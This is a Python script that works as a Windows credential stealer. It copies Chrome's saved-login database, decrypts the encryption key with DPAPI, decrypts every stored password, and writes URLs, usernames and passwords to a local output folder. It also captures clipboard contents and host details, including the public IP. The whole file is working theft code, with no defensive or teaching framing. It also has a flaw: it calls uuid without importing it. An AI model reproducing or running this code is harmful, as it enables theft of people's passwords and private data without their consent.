import os
import json
import base64
import shutil
import sqlite3
import pyperclip
import socket
import platform
import requests
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime

# Output directory
OUTPUT_DIR = "output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

def get_encryption_key():
    """Extract Chrome's AES encryption key"""
    local_state_path = os.path.join(
        os.environ['USERPROFILE'],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Strip DPAPI prefix
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except:
        return "Decryption Failed"

def extract_chrome_passwords():
    """Extract and decrypt saved passwords from Chrome"""
    db_path = os.path.join(
        os.environ['USERPROFILE'],
        "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"
    )

    temp_db = "chrome_temp.db"
    shutil.copy2(db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    key = get_encryption_key()

    with open(os.path.join(OUTPUT_DIR, "passwords.txt"), "w", encoding="utf-8") as f:
        f.write("== Chrome Saved Passwords ==\n\n")
        for url, username, password in cursor.fetchall():
            decrypted_pass = decrypt_password(password, key)
            f.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_pass}\n\n")

    cursor.close()
    conn.close()
    os.remove(temp_db)

def capture_clipboard():
    """Capture clipboard content"""
    try:
        clipboard_content = pyperclip.paste()
        with open(os.path.join(OUTPUT_DIR, "clipboard.txt"), "w", encoding="utf-8") as f:
            f.write("== Clipboard Content ==\n\n")
            f.write(clipboard_content)
    except Exception as e:
        with open(os.path.join(OUTPUT_DIR, "clipboard.txt"), "w") as f:
            f.write("Failed to capture clipboard content.\n")

def gather_system_info():
    """Gather local system info and public IP"""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        public_ip = requests.get("https://api.ipify.org").text
        mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                            for ele in range(0, 8 * 6, 8)][::-1])
    except:
        public_ip = "Unavailable"
        local_ip = "Unavailable"
        mac_addr = "Unavailable"

    sys_info = f"""
== System Information ==

Date: {datetime.now()}
OS: {platform.system()} {platform.release()}
Architecture: {platform.architecture()[0]}
Hostname: {hostname}
Local IP: {local_ip}
Public IP: {public_ip}
MAC Address: {mac_addr}
Processor: {platform.processor()}
"""
    with open(os.path.join(OUTPUT_DIR, "system_info.txt"), "w", encoding="utf-8") as f:
        f.write(sys_info)

if __name__ == "__main__":
    extract_chrome_passwords()
    capture_clipboard()
    gather_system_info()
    print("[+] Data extraction completed. Check the 'output' directory.")